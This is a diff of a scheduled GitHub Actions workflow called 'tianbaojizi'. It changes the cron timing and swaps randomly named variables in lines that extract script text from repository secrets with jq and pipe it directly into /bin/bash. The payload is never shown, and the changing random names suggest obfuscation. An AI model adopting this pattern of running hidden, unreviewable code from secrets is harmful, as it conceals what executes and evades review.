@@ -2,24 +2,24 @@ name: tianbaojizi
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 5/6 * * *'
+    - cron: '38 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: tianbaojizi
         env:
-          h5: ${{ secrets.h5 }}
+          mqg04: ${{ secrets.mqg04 }}
         run: |
-          echo $h5 | jq -r .xxu7 | /bin/bash
-          echo $ml2414 | jq -r .qlzo53 | /bin/bash
-          echo $bfbtc934 | jq -r .moeu8548 | /bin/bash
-          echo $mjx778 | jq -r .iyker3 | /bin/bash
-          echo $yx8236 | jq -r .bwkns0690 | /bin/bash
-          echo $ep5434 | jq -r .pss9468 | /bin/bash
-          echo $uwwbf026 | jq -r .brqv56 | /bin/bash
-          echo $pnt00737 | jq -r .kpza3369 | /bin/bash
-          echo $b74 | jq -r .t1264 | /bin/bash
+          echo $mqg04 | jq -r .oi2654 | /bin/bash
+          echo $jx16 | jq -r .xr078 | /bin/bash
+          echo $jgu2732 | jq -r .gcot7170 | /bin/bash
+          echo $twk700 | jq -r .n136 | /bin/bash
+          echo $jhicb673 | jq -r .uhc2664 | /bin/bash
+          echo $q1 | jq -r .npp21317 | /bin/bash
+          echo $lwbue21 | jq -r .j2138 | /bin/bash
+          echo $vxn28441 | jq -r .r7077 | /bin/bash
 
